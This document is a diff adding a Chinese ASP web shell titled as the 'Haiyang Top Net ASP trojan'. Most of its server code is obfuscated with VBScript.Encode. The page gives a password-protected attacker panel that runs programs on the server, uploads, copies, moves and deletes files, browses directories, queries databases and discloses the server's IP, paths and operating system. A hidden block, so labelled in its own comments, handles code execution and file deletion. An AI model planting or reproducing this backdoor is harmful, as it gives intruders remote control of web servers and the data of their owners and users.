@@ -1,0 +1,387 @@
+<%@ LANGUAGE="VBScript.Encode"  codepage ="936" %>
+<title>::::海阳顶端网ASP木马XP.net 欧阳逍遥 版::::</title>
+<style>
+body{font-family: 宋体;   font-size: 10pt}
+table{ font-family: 宋体; font-size: 9pt }
+a{ font-family: 宋体; font-size: 9pt; color: #000000; text-decoration: none }
+a:hover{ font-family: 宋体; color: #ff0000; text-decoration: none }
+input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
+</style>
+<DIV id=img 
+style="LEFT: 44px; WIDTH: 170px; POSITION: absolute; TOP: 24px; HEIGHT: 161px">
+<TABLE cellSpacing=0 cellPadding=0 width=147 border=0>
+  <TBODY>
+  <TR>
+    <TD>&nbsp;</TD>
+    <TD>&nbsp;</TD>
+    <TD>&nbsp;</TD></TR>
+  <TR>
+    <TD>&nbsp;</TD>
+    <TD><center>   [黑客0起点]  </center><br>欧阳逍遥  <br>QQ87537111<br>http://www.org.ful.cn</TD>
+  <TD>&nbsp;</TD>
+    <TD>&nbsp;</TD>
+    <TD>&nbsp;</TD></TR>
+  <TR>
+    <TD>&nbsp;</TD>
+ </TBODY></TABLE>
+<DIV align=center></DIV></DIV>
+<SCRIPT language=javascript>
+<!-- 
+var xPos = 20;
+var yPos = document.body.clientHeight;
+var step = 1;
+var delay = 30; 
+var height = 0;
+var Hoffset = 0;
+var Woffset = 0;
+var yon = 0;
+var xon = 0;
+var pause = true;
+var interval;
+img.style.top = yPos;
+function changePos() {
+width = document.body.clientWidth;
+height = document.body.clientHeight;
+Hoffset = img.offsetHeight;
+Woffset = img.offsetWidth;
+img.style.left = xPos + document.body.scrollLeft;
+img.style.top = yPos + document.body.scrollTop;
+if (yon) {
+yPos = yPos + step;
+}
+else {
+yPos = yPos - step;
+}
+if (yPos < 0) {
+yon = 1;
+yPos = 0;
+}
+if (yPos >= (height - Hoffset)) {
+yon = 0;
+yPos = (height - Hoffset);
+}
+if (xon) {
+xPos = xPos + step;
+}
+else {
+xPos = xPos - step;
+}
+if (xPos < 0) {
+xon = 1;
+xPos = 0;
+}
+if (xPos >= (width - Woffset)) {
+xon = 0;
+xPos = (width - Woffset);
+}
+}
+function start() {
+img.visibility = "visible";
+interval = setInterval('changePos()', delay);
+}
+start();
+// End -->
+</SCRIPT>
+<style>
+BODY {
+	SCROLLBAR-FACE-COLOR: #ffe1e8; FONT-SIZE: 9pt; SCROLLBAR-HIGHLIGHT-COLOR: #ffe1e8; SCROLLBAR-SHADOW-COLOR: #ff9dbb; COLOR: #f486a8; SCROLLBAR-3DLIGHT-COLOR: #ff97b9; SCROLLBAR-ARROW-COLOR: #ff6f8f; SCROLLBAR-TRACK-COLOR: #ffe1e8; SCROLLBAR-DARKSHADOW-COLOR: #ffd9e0
+}
+A:link {
+	FONT-SIZE: 9pt; COLOR:  #db7093; TEXT-DECORATION: none
+}
+A:visited {
+	FONT-SIZE: 9pt; COLOR:  #db7093; TEXT-DECORATION: none
+}
+A:hover {
+	FONT-SIZE: 9pt; COLOR:  #ffb6c1; TEXT-DECORATION: none
+}
+TABLE {
+	BORDER-RIGHT: #c875a5 1px dotted; BORDER-TOP: #c875a5 1px dotted; FONT-SIZE: 9pt; BORDER-LEFT: #c875a5 1px dotted; BORDER-BOTTOM: #c875a5 1px dotted; BORDER-COLLAPSE: collapse
+}
+.noborder {
+	BORDER-RIGHT: medium none; BORDER-TOP: medium none; FONT-SIZE: 9pt; BORDER-LEFT: medium none; BORDER-BOTTOM: medium none
+}
+INPUT {
+	CLEAR: both; BORDER-RIGHT: #c875a5 1px dotted; BORDER-TOP: #c875a5 1px dotted; FONT-SIZE: 9pt; BACKGROUND-IMAGE: url(images/background2.gif); WORD-SPACING: normal; VERTICAL-ALIGN: middle; OVERFLOW: hidden; BORDER-LEFT: #c875a5 1px dotted; WIDTH: auto; COLOR: #c875a5; BORDER-BOTTOM: #c875a5 1px dotted; BACKGROUND-REPEAT: repeat; WHITE-SPACE: normal; LETTER-SPACING: normal; HEIGHT: auto
+}
+TEXTAREA {
+	CLEAR: none; BORDER-RIGHT: #c875a5 1px dotted; BORDER-TOP: #c875a5 1px dotted; FONT-SIZE: 9pt; BACKGROUND-IMAGE: url(images/background2.gif); WORD-SPACING: normal; VERTICAL-ALIGN: middle; BORDER-LEFT: #c875a5 1px dotted; WIDTH: auto; COLOR: #c875a5; BORDER-BOTTOM: #c875a5 1px dotted; LETTER-SPACING: normal; HEIGHT: auto
+}
+SELECT {
+	CLEAR: none; BORDER-RIGHT: #c875a5 1px dotted; BORDER-TOP: #c875a5 1px dotted; FONT-SIZE: 9pt; BACKGROUND-IMAGE: url(images/background2.gif); WORD-SPACING: normal; VERTICAL-ALIGN: middle; BORDER-LEFT: #c875a5 1px dotted; WIDTH: auto; COLOR: #c875a5; BORDER-BOTTOM: #c875a5 1px dotted; LETTER-SPACING: normal; HEIGHT: auto
+}
+.haveborder {
+	BORDER-RIGHT: #c875a5 1px solid; BORDER-TOP: #c875a5 1px solid; FONT-SIZE: 9pt; BACKGROUND-IMAGE: url(images/background2.gif); BORDER-LEFT: #c875a5 1px solid; BORDER-BOTTOM: #c875a5 1px solid
+}
+.radio {
+	CLEAR: both; BORDER-RIGHT: #ffffff 1px solid; BORDER-TOP: #ffffff 1px solid; FONT-SIZE: 9pt; FLOAT: none; VISIBILITY: inherit; OVERFLOW: hidden; BORDER-LEFT: #ffffff 1px solid; WIDTH: auto; CLIP: rect(auto auto auto auto); COLOR: #ffffff; BORDER-BOTTOM: #ffffff 1px solid; POSITION: static; HEIGHT: auto; BACKGROUND-COLOR: #ffffff
+}
+.hborder {
+	BORDER-RIGHT: #c875a5 1px solid; BORDER-TOP: #c875a5 1px solid; FONT-SIZE: 9pt; BORDER-LEFT: #c875a5 1px solid; BORDER-BOTTOM: #c875a5 1px solid; BACKGROUND-COLOR: #fef1ef
+}
+.head-foot {
+	BORDER-RIGHT: 0px; BACKGROUND-POSITION: center center; BORDER-TOP: 0px; BACKGROUND-IMAGE: url(images/line4.gif); BORDER-LEFT: 0px; BORDER-BOTTOM: 0px; BACKGROUND-REPEAT: no-repeat
+}
+</style>
+<%#@~^MwAAAA==~EeMCeCeeCeCMeCeM隐含的另一套代码执行和删除程序开始eCeMMCeeCMeCeeC~~cwUAAA==^#~@%>
+<%#@~^6AMAAA==~@#@&dVmY,mmd+,Dn;!+dOvJl1OkKxJ*@#@&d1lk+~J执行E@#@&d7DdE^Yx3X+m;OsrVcM+5!+kY`rD!UJ*#@#@&,P~~,PP,^lk+Pr[nVr@#@&P~P~~,P~P,~P,P~~M+/;sD'9+^nD+obV`D;!n/D`E0bVnUm:+rb#@#@&P,~~P,P,+UN~dVnmD@#@&@#@&W;	mYrG	P9+^nD+obV`0bV9+^#@#@&,P~~KxP.DKDPMndEs+,xn6O~@#@&~P,~Nb:~Wk@#@&~~,Pj+D~6/~{P;D+mY64N+^YvJj^MkwDrxTRsbsn?H/D+hr8%mOJ*@#@&M+d2Kx/n SDrY~r文件删除PcrPLP0bV9+^P'Pr#xELm/D.`6/Rwrs+A6b/O/cWbVnfs#*[E@!~I@*E~,P~@#@&~,P~b0,0/csbs+A6r/D/cWbV+GnV*PY4nUP,P,P~P~@#@&P~P,~P,0d G+VnOsrV~6ksfV~DD!n@#@&P~P,+U[,k0@#@&P,PPbW~+MD@*!~Y4n	P@#@&,~P,P~~DD ^^+CD@#@&,P~,P,PfVO+wks+{0Csk+@#@&~P,P+^dnP@#@&,P~P~~,fnVO+wksn{YD;n@#@&~P,~x[,k6PP,P@#@&+	N~0!x^ObWx@#@&@#@&0E	^OkKx,2a+^;D+ok^n`6ksnA6+b@#@&dj+D~q?4UtVV,',j+M\nDcZ.nmY+}8LmYvE	?1DbwORj4VsJ*@#@&iInO;WNn~{P	?4j4+s^R"Exv0bs+A6n~,FS~:DEb@#@&dk6~]+DZKNnPx~ZPPtU@#@&d~~,PBP4DnPSnM+~	W,+DMWMd@#@&d72X+^;D+sbs+{KD!n@#@&i+^/n@#@&~,P~dAa+1EOnwkVnxwls/@#@&dn	N,k0@#@&Mn/aWU/RA.bY+,EI!x[	8dwr[r[U4d2r[Wk^n+X+'ELx4d2r[n6^!Yn6k^+@#@&+	[P6EUmDkGU@#@&PMxIBAA==^#~@%>
+<%#@~^LAAAAA==~EeMCeCeeCeCMeCeM隐含的另一套代码结束eCeMMCeeCMeCeeC~~cwUAAA==^#~@%>
+
+<%#@~^KAAAAA==~EeMCeCeeCeCMeCeM上传文件开始eCeMMCeeCMeCeeC~~cwUAAA==^#~@%>
+<%#@~^GQAAAA==~b0~M+$E+kYvEEaJb'8PO4xP7wcAAA==^#~@%>
+<%#@~^GQAAAA==jD-Dc?mMkaOKb:nr!YxXZ!!4wgAAA==^#~@%>
+<SCRIPT RUNAT=SERVER LANGUAGE=VBScript.Encode>#@~^AhEAAA==@#@&NrsPGlYm{la/K0O@#@&ZsCk/P!2VKlN|Xa/K0D@#@&Nrh,W8LwGDs~G8NsksnB.nDkrKx@#@&n!4Vbm,WE	mOkKx~oKD:vdYMsWMhb@#@&/DDoW.h{V^lkn`kY.oKD:b@#@&kWP	GDPG(LwWDsRakkYd`kY.oKD:*~Y4+x@#@&oWM:{JE@#@&n^/n@#@&oWM:xG(LsG.s`dYMoKDh*@#@&+x9PbW@#@&+UN,0;U1YkKU@#@&nE(srm,0!x^YrG	Pok^n`kY.obV+b@#@&/ODwr^+x^mm/+v/D.sbVn#@#@&rW,xWD~W(LsbsnR6b/O/cdDDok^n#,Y4n	@#@&dnDPok^n{xnSPwkVq	WW@#@&nVk+@#@&k+Y,ok^+'K8%sbV`dY.obVn#@#@&+	N~r6@#@&nU9PWE	^DkG	@#@&nDb\mO+,?;4,ZsCk/{&UkDkl^r"+@#@&9khP]n$En/D9lDlSdUYl.OB\8ZMs6~d&x6W~bq	WWUYCDD~r(	0WAUNBY?D.nls~b?Ol.OBY4+wrV@#@&[b:ProbVn?b"~dwk^+nmY4S/wks+:X2nB/sK.:jlV!nS/wk^+Hlhn@#@&[ks~kwkU[UYl.OBkok	[Ax[@#@&9k:,kwGDs?OlMYSrwWDs3x9~/wG.:gls+@#@&dnDPG4NoWM:xjD\n.cZ.+mOr8N+1Y`r?1.kaYrxTR9r1YkKUlMXJ*@#@&/Y,W8Lor^+x?.\D /M+lOn}4%+1OvJj1DbwYbxT fbmOkKxC.HJ#@#@&k6PI5;+kYcKGYCs~XO+k@!F,Y4n	P2arDPjE(@#@&/nDPD?YM+mhP{Pj+M\n.cZDCYr4Nn^YvJmNGN8 kY.+mhJ*@#@&dYP9CDlm*XdK0O,',?+M\.R;DnlD+68N+mDcJmNW98 /DDlhJb@#@&fCYmm*X/GWDRKz2PxP8@#@&fCDl|*6kW6ORtW[+,'f@#@&flDC{l6/KWOR}wx@#@&9CDlm*XdW6Y 	MkYn~,In;!nkY ~k	lDHICNvIn;!+dOcKWDCV~XYdb@#@&fmYC{XakWWYcKWkkOrKx'T@#@&In;!nkY9mYmP'GlDC{l6dW6Y ]lN@#@&kwWDsjOlMY,'~F@#@&bsGDs3x9Px~d+x$c"+5EdDfCDl*@#@&74;.V6PxP1t.$vF&*~[,mtM$cFZ#@#@&d?OCMY~',\k9Ac];EndDfCYmS8~~&xUYD~`boWM:jYmDOS"+;!n/DflDCS\(ZMVW#Rq*@#@&kUOlMY~x,S+U$,`d?DCMYb@#@&bsWM:UOlMYxkwW.hUYlMO_b?Ym.O_8@#@&h4ksn,`rsK.:UYC.DP_~qZ#~@!,rwW.s2	N@#@&k&U0K2UN,'~(	?YM$`bsWMhjYmDD~]+5;/OfmOlB\8/MV0~',\8ZMs6#Q2@#@&Y?DDC:cKzwPx~8@#@&DjYM+ls \W9+,'f@#@&OUY.+mhR}wnU@#@&fCOm{X6kG6Y hWkkYbW	~',koWM:jOmDY@#@&fmYl|Xa/K0DR/W2z:W~YUODlhSbqxWGAx[OboKDhUYmDY@#@&DjYM+C:cnGdbYkKUP{P!@#@&O?DDlhRPza+~',+@#@&YjOM+lh ;tCDknDPxro( &8 r@#@&kqU0KPx~D?YMnlsRIC[K6D@#@&YjOM+C:c/VK/n@#@&ksG.s?OlMO,'~&xUYD~`b(x6W3x9~]n$E+kOfmYlBdjYmDD#@#@&robx[?DCDDPx~&x?O.v +~k(	0GBJ	l:'rEJBFb_+@#@&rwkx93x9P',(U?DDvkokU[UYCDDS/&xWGBJJEEBFb@#@&dwW.s1m:+,',smm/n`tk[~v/k	WWBksbU[?DlMYSkor	N3x9RkwkU[UYl.O*#@#@&bW,qUUYMP`W*Bdq	0G~r0rsxlsn'rJJBqbP@*PZPOtnU@#@&d+D~Y4+or^+'UnSPok^n&xWK@#@&ksbx9jYmDOP{P(UUYDvrsbxNAU[~kq	0G~EWbVnxmh+{JEEBF#QqZ@#@&kwr	N3	N,'P&xUODvkok	NjOmDYBdq	0WBEEJr~8#@#@&dobVn1mh+,'~\bNPcdbxWWBrwkU9?DlDD~bok	N3x9OrobxNUOlMY#@#@&OtsbVnRor^+Hlsn'T+OobV+HCs+c/wr^+Hm:#@#@&Y4nsbVnRwksnhlY4xoYsbsnnmY4`dsrs1C:b@#@&kor	N?OCMY~',(	?OM`bsk	NAUNB/(x6WSE;WxDnxDOKH2n),JBFb_q*@#@&rsbUNAx[~{PqUjDDckwr	NjDlMY~kq	WWB\8ZM#@#@&Dt+wrVRsbsnKHwPxHr[,`dk	WWBkor	N?OCMYSkwr	N3	N ksbx9jYmDO#@#@&O4sk^nRwkVjOlMY,'rqUWK2UN@#@&Y4+or^+Ror^+jk.n,'~bsKD:UYm.Y,Orq	0G3	NP f@#@&YtorVRwW.:HCs+x/wGDs1Ch@#@&rW,xGY,G(LobVR2XkkO/v/oWM:HCs+#,Otx@#@&G8Lwk^+ l[[,/oWMh1m:nSDt+or^+@#@&U9Pr6@#@&+Vk+@#@&YUY.+m: PHw+,xF@#@&YUO.+m:cHGNn~{&@#@&DjYM+ChcrwnU@#@&9lDC|*akW6YRhWkrYbWUP{Pr(	0WAUN@#@&fmOC{l6kWWY /KwzKK~YUY.nm:~roKDh?DCMYRbq	0WAx9R&@#@&O?DDnCsRnKdkDkW	~xPZ@#@&YjY.nm: KH2+,'~+@#@&YjOM+C:c/4l.k+DP'ro(+&8 E@#@&/oGM:.msEP',OjYM+m: InC9Kn6D@#@&D?O.l: /^Wd+@#@&b0~K4NsWM:c36b/O/v/oGM:1mh+*PY4nU@#@&W(LoW.hv/oWMh1m:nb{W4%oKDh`koKDhgls+#LJB~JL/oWM:#C^E+@#@&+^/+@#@&G4NsKDhR)[9PdsK.:glhnB/sG.s.CV!n@#@&n	N,k0@#@&UN,kW@#@&koGM:?DCDD'kwG.:UYmDO_rjDl.Y3q@#@&hnU9@#@&]n$En/D9mYC{Jr@#@&k+D~YUY.+m:~x	WY4rxT@#@&AU[PUE(@#@&n.r7lO+,jE(P/sm//mPDhk	CD+@#@&k6PI;!n/DRPWDls$HY+k@*!,YtU@#@&K4NsGDh "+hW7nb^V@#@&K4Lor^+ IhK\nzV^@#@&k+D~W(LoWM:xUKYtbUo@#@&/O~W(Lwks+xUKY4k	L@#@&fCOm{*adK0OR;sK/n@#@&k+Y,fmOl|*a/K0O~{xWD4k	o@#@&nUN,k6@#@&2U[,?;4@#@&nMk-CD+PW;	mOkKU,MnDsbV+hlD4`wEsVhlO4*@#@&&WPwEV^KCY4P@!@*~JE~:tnx@#@&MYor^+nCO4PxP^n6YcwE^VnmY4Sq	?OD"+-cwEV^KlDt~,EwJ*#@#@&3Vdn@#@&!+Dok^+KCDtPx~rJ@#@&AU9P(6@#@&2x9P,WE	mOkKx@#@&hDk7CYP0!U^YbW	P!+OobVn1mh+vs;s^nlO4*@#@&q6~wEs^nmYt,@!@*~JrPPtx@#@&V+YwrV1lsn~',:bNcs;s^nCY4Sq	?O."+\co!VsnmO4~~r-r#_8#@#@&2^/n@#@&MnOwkVHls+P{~EJ@#@&Ax[P(W@#@&3x9~P6EU^DkWU@#@&2UN,/^ldk@#@&ZVm/k~sbVnq	0G@#@&Nks~sKD:gCh+BsbVn1Ch~ok^nnmY4SwkVnjbyn~wr^+PHw~sbVjYmDO@#@&n.r7lY~?!4P;sC/k{&xrYrC^k"+@#@&sbVnHm:+~x,JE@#@&obVnhlDtP{PrE@#@&srV?r"P',T@#@&sk^njYmDD'~!@#@&wW.:gC:Px~rJ@#@&obVnKH2Px,Jr@#@&Ax9~?!4@#@&hE8sbmP6;x1YkKU~?m\bd`o;^VKlD4#@#@&[rsPN.SAD.WM/4l.Bk@#@&?m\)/{Y.E@#@&r6PYMr:v0E^s2lDt*'EJ~GMPok^n?Dl.O{!PG.,srVHm:n{JrPWMPMro4Yc0!Vs2mYtBq#{Jzr~Otx,+akO~6EUmDrW	@#@&dYP[.{Z.+mOr8N+1Y`rb9GN(RjYM+Chr#@#@&[DcHW9nx&@#@&9D Kz2'q@#@&[Dcr2n	@#@&9CDlm*XdK0OcwK/kDkKU'wks+UYC.D@#@&GCYm{*XdG0DR1W2XOG,N.~wrV?r"@#@&[.c?C\PKsr^+,sE^VhCY4~+@#@&N. ;VWkn@#@&/+D~[D{xKY4kUL@#@&jl7nbk'WC^/+@#@&x[P6;	mObW	@#@&Ax9~Z^ld/@#@&wkMFAA==^#~@</SCRIPT>
+<%#@~^9wcAAA==@#@&NrsP!wVKl9S0bVn~6W.hgl:S0KD:hCOtBk;W;xO@#@&/nY,;w^WC[{x+A~!wsWm[|*akW6Y@#@&k6~EaVGl9RWGM:`rWk^+wmO4J*'rJ~Y4n	@#@&DdwKxdnchDrOPE请输入要上传至的目录"r@#@&/nDP!wVKl9xxKY4k	o@#@&M+/aGxk+RU[@#@&+^/n@#@&WKDhnmOt{E2sKlN WKDh`rWbVnalDtJ*@#@&r0,Dro4YcWKD:hCY4~F*@!@*JJJ,Y4+U~6W.:hCY4'WGM:nCO4[Ezr@#@&+U9Pb0@#@&k;GE	Yx!@#@&WGMP+m^t,0WMhHls+,kUP;2^WCNcG4NsG.s@#@&UnXY@#@&MnkwG	/RhMkDnPr@!8D@*J@#@&6WD,nl1tP6G.:gls+~kU~!wsWm[RK4%obV+@#@&k+OP6r^+x!w^Wl9R6rV`WWM:HCs+#@#@&k6P0bsnRwk^+jk"n@*!~Y4nx@#@&vWbV+ jm\nbk~U+.7+MR:mwaCY4`WWM:KCDt[6rVRsbsn1m:#@#@&Wr^+ ?m-+z/~WKD:KCDt'0bsRobV1ls+@#@&D/2W	/n SDkDnPr@!mUO+M@*r[WksncsrVKlDt'WbV+ obVn1mh[E,`r[0bV sbVn?byn'r#P{@*Pr[0K.hnmY4[oksncsrVHls+'E,上传成功"@!&^xO+M@*@!4.@*J@#@&k;W!UY{k/W!xOQ8@#@&UN,k0@#@&d+DP6ks+xUKY4k	L@#@&xnaD@#@&dnDP;w^GmNx	WDtk	o@#@&D/2W	/n SDkDnPr@!mUO+M@*r[rZG;	Y'J个文件上传结束e@!z1+UOD@*E@#@&Dn/aG	/nchMkYPr@!mxO+M@*@!8M@*@!m~tM+0{EELm\m/^Dr2D)4kkOWMX 8mm3cbpJE@*@!WKxO,mKVWM'E:fZ!T!ZB@*返回上一页@!J0W	O@*@!zl@*@!&mxD+.@*E@#@&@#@&PEMeCeMMCeeMMCeMe上传文件结束,MCeMCeCeeCeCMeC@#@&@#@&+sd@#@&;G'"+;!ndYc?D-+.#mDrl(s+k`Ej;IqKP|1)HAE*@#@&@#@&b0PDDbh`M+5E/O 6WDscJal/kAGD9J*#@!@*EE,lUN,ODb:c.;EndDRWWMhvJ2m/khWMNrb#@!@*E6blGzmWJ,OtxP1CsV,W!Yc#~@#@&kWPD.ks`.n$E+dOc0GDscrwCk/SWD9J*b'r6rlKXCGrPY4nx@#@&/ddkKxvJ2lddSW.Nrb'rlssxJ~@#@&Dn/aG	/ncDNkM+1OPrJ'mK[EE,@#@&s/Pk6~d+k/bWU`E2m/dhK.Nr#@!@*rlVsn	J~Y4n	P@#@&mmVV,VKLk	`bPE密码错误@#@&./wKU/R+	[~B停止运行@#@&x[PrW@#@&d+^nmDP^Ck+P.n$En/Dcrk[r#@#@&mm/~JNrYr@#@&^mVV,nNbY`*@#@&mm/PEE2sKl[J@#@&mmVs~!wVGC9`b@#@&^m/n,J9kDr@#@&^l^V~NbDcb@#@&mmd+,JNKAUJ@#@&EDn/2G	/nRS.kD+~.;EndD`EwmO4Jb@#@&1lV^P9Gh	VGl9srs`D5E/YvE2lDtr#b@#@&@#@&mC/~+^/n@#@&mlss,:Ck	c*@#@&x9P/V^Y@#@&nx9PrW@#@&/!8P^WobUc#@#@&6W.PrxZPOW,+*@#@&GU,+D.GMP.+k;s+~	+XY@#@&qk64N'Wl^/n@#@&.+M64N'Jr@#@&Nb:,Kn/O6(L@#@&knY,KndDr4%xk+.\.cZ.lD+r(L^Yvr8L:WOnkY`bS!*#@#@&(WP  8c{ +qZ!XP@!@*PAD.~Dt+U@#@&qdr(%,'~:D!+@#@&..r(L~',KndDr4N \D/bGU@#@&k6P#+.6(LxJr~WMPrd	EVscj+.r(%*PO4+	P.D}8L{Kn/Dr8%cl4K;Y@#@&+	[~k6@#@&r8LPGD+dYvr~y#x(kr4%@#@&r8L:GD+dD`b~&*'jnD}4%@#@&xnaD@#@&bUoCAA==^#~@%>
+<body><center>
+<table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8">
+<tr><td>
+<table border=0 width=100% cellspacing=1 cellpadding=0>
+<tr bgcolor="#EEEEEE" height=18>
+<td width="59%" align=left>&nbsp;服务器名</td>
+<td width="41%" bgcolor="#EEEEEE">&nbsp;<%=#@~^JgAAAA==];;/DR?D7nDjl.km4snk`JU3Ij2I|H)HAJ*Ew0AAA==^#~@%></td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>&nbsp;服务器IP</td>
+<td>&nbsp;<%=#@~^JQAAAA==];;/DR?D7nDjl.km4snk`Jd6ZzS{z99Ir#oQwAAA==^#~@%></td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>&nbsp;服务器端口</td>
+<td>&nbsp;<%=#@~^JgAAAA==];;/DR?D7nDjl.km4snk`JU3Ij2I|K6I:J*Nw0AAA==^#~@%></td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>&nbsp;服务器时间</td>
+<td>&nbsp;<%=#@~^AwAAAA==UKhVAEAAA==^#~@%></td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>&nbsp;本文件绝对路径</td>
+<td>&nbsp;<%=#@~^NgAAAA==dD-Dc:lawmOtvIn;!+dOc?+M-+M.lMrC4^+k`E?/]&nP{g)HAJbbEhMAAA==^#~@%></td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>&nbsp;服务器CPU数量</td>
+<td>&nbsp;<%=#@~^LwAAAA==];;/DR?D7nDjl.km4snk`JgiH~2I|6o{hI}Z3?j6"?E#6w8AAA==^#~@%> 个</td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>&nbsp;服务器操作系统</td>
+<td>&nbsp;<%=#@~^HQAAAA==];;/DR?D7nDjl.km4snk`J}jJ*XgoAAA==^#~@%></td>
+</tr>
+<tr bgcolor="#EEEEEE" height=18>
+<td align=left><font class=fonts>服务器运算速度测试</font></td>
+<td>&nbsp;完成时间</td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>LCX的电脑（64M,赛羊433）</td>
+<td>&nbsp;980.5 毫秒</td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>中国频道虚拟主机（2002-08-06）</td>
+<td>&nbsp;610.9 毫秒</td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18>
+<td align=left>西部数码west263主机（2002-08-06）</td>
+<td>&nbsp;357.8 毫秒</td>
+</tr>
+<tr bgcolor="#FFFFFF" height=18><%#@~^kwAAAA==@#@&NrsPDF~D Bs/m4^~DtnOb:+@#@&Y8'YbhnD@#@&6W.Prx8POW,X!Z!TT@#@&VdC(mxP8~3Pq@#@&	+6D@#@&O {Yr:D@#@&Dt+Dr:'mkO.`bxD`cPcOyOOF*MFZ!TT,#_T l#&FZb@#@&6iMAAA==^#~@%><td align=left><font color=red>您正在使用的这台服务器</font>&nbsp;</td>
+<td>&nbsp;<font color=red><%=#@~^BwAAAA==O4+Ob:8AIAAA==^#~@%> 毫秒</font></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+<html>
+<body><center>
+<table>
+<%#@~^TwAAAA==./2Kxk+RSDbO+,J@!0KxO~1Vlkd'6WxDd@*一次只能执行一个操作)*在本页操作不需要sUr支持'当服务器时间@!&WKxO@*r~6xAAAA==^#~@%>
+<%#@~^FAAAAA==./2Kxk+RSDbO+,xGhv#jQcAAA==^#~@%><BR>
+<form action="<%=#@~^IAAAAA==~"+5!+kYRU+M-+M.CDbl8s/`riIdJ#,7woAAA==^#~@%>" method="POST">
+<input type=text name=text value="<%=#@~^BgAAAA==9UxpzPvgEAAA==^#~@%>">  <font class=fonts>输入要浏览的目录,最后要加\</font><br>
+<input type=text name=text1 value="<%=#@~^BwAAAA==9UxpzF,7wEAAA==^#~@%>">
+复制
+<input type=text name=text2 value="<%=#@~^BwAAAA==9Uxpz ,8AEAAA==^#~@%>"> <font class=fonts>目的地址不要带文件名</font><br>
+<input type=text name=text3 value="<%=#@~^BwAAAA==9Uxpz&,8QEAAA==^#~@%>">
+移动
+<input type=text name=text4 value="<%=#@~^BwAAAA==9Uxpzc,8gEAAA==^#~@%>"><font class=fonts> 目的地址不要带文件名</font><br>
+路径：<input type=text name=text5 value="<%=#@~^BwAAAA==9Uxpz*,8wEAAA==^#~@%>">
+程序：<input type=text name=text6 value="<%=#@~^BwAAAA==9Uxpzv,9AEAAA==^#~@%>"><font class=fonts> 不可以加参数</font><br>
+<input type=submit name=sb value=发送命令 class=input>
+</form>
+</table>
+</center>
+<%#@~^1wYAAA==~@#@&9b:,/YM?5J~,W8LGA/G	x~,G4NI?B~rxDsb+sN/G!xO~,rxDZG;	Y+.SsN8@#@&h94~{P"+;!+kOR5EnDH?O.bxovE:94J*@#@&/DDUpJPx~"+5EdYcp;nMX?O.bxL`rj5SE*@#@&q0,/D.?5S~@!@*PEE,lx9~V0YvO.ks`kY./5s*~#{E/Vn^DJPP4x@#@&,~,InkwKx/Rq.kD+~JUpJ字符串l,JPL~/DD?5J~[,J@!4.@*E~@#@&~P,vP建立数据库连接的对象@#@&~~,?+O~K4%f~/KxU,',?+M\.R;DnlD+68N+mDcJzfrG$ ZKx	+^YrG	Jb@#@&~P,B~打开数据库连接~sN4请改为你要连接的数据库名字@#@&,P~W(%GA/Kx	Rra+	~JGI(.AIx`tkmMG/K0Y,)^m/kP9Dr-D~`C :94bNpPf$}{J~[,jD-DcHlanmOtv:[4*@#@&~,PB,执行jpd的数据库查询@#@&,~~?Y,W8L]j,'~W(%f~mGU	R2an1EO+vdDDj5S*@#@&,P,vP取得域的个数@#@&~P,kUOwk+^[ZKExD~xPK4NIjRorV[/c/W!xO~ PF@#@&,P~B,检查是否有记录~@#@&~,P&0PgWD~W(L]?c2GW,KtU@#@&PP,~~P"+kwGxdnc.kDnPr@!OC(V+~8KD[+Mx8@*@!DD@*JP,P@#@&P,P~P,B~显示数据库的域名@#@&PP,~P,sWM~rxDZKEUYn.,'~!,OW,kUOwk+s[;W;xD@#@&P~,P,PP,P,]+kwGxk+ 	MkY~J@!YN@*@!8@*rPLPG4%]U`rxD/W!xOnM#RHCs+~[,E@!z8@*@!JYN@*J@#@&P,P~P,1naD@#@&,~P,PP"ndwKxk+ .rD+~J@!&YM@*E@#@&PP~~,PvP显示数据库内容@#@&,P~,P,fW,4rVPHWDPG8NI?c3W6@#@&,~~P,P,P~IndaWU/ MkOn,J@!O.@*J~P,~,@#@&,P,PP,P,~B,显示每个记录的域P@#@&,P~~,PP,~sKDPbUOZKE	YnD~x,!~YK~k	YorVN/G!xO@#@&~,P~,P,PP,P,~q6PG4NIj wk+^[/vkxD/GE	YDbR#C^EnP@!@*PrJ~P4+x@#@&,P~P,~,P~,P,PP,P"n/aWU/R	.bY+,E@!DNP7CskTx{JEYG2rJ@*J,'PK4%]URsrn^Nd`bUDZG!xD+D*RjCV!+~[,J@!&DN@*r@#@&,PP,~~P,P,P~P3sk+@#@&,~P,P~~,PP~~,P~P"nkwG	/RMkDnPr@!ON,\Csbox{EJDWwrE@*O O@!zON@*E@#@&~P,~P,P~~,PP~3	N~q6@#@&P~,P,PP,Pgn6D@#@&P,P~~,PP,]+kwW	dnRqDbYnPE@!JY.@*r@#@&,P~~,PP~~K4%IU tW-16Y,PE~移到下一条记录@#@&P~P,P~JKWw@#@&P,PP,~]+kwKxd+ 	MkO+,E@!JYC8^+@*E@#@&P~PAsk+@#@&P,PP,P"n/aWU/R	.bY+,E@!(@*没有符合条件的记录@!J8@*@!(D@*J~@#@&~,P3x9~q6@#@&@#@&PP~G(L]?c/^WdP,PP,P,~PEP关闭记录集合@#@&,P~jYPK8L"?P{~HWDtbxL@#@&~,PG4N9A;WUUcZVGdP~P,~EP关闭数据库连接@#@&P,P?Y,G4Nf$ZKxU~{P1KOtbxo,@#@&+	N,kW@#@&r6PdYMjpdP@!@*,JJ~C	N~VWD`OMks`/DDk5V*~#@!@*EdV+1OJ,KtU@#@&nJ8BAA==^#~@%>
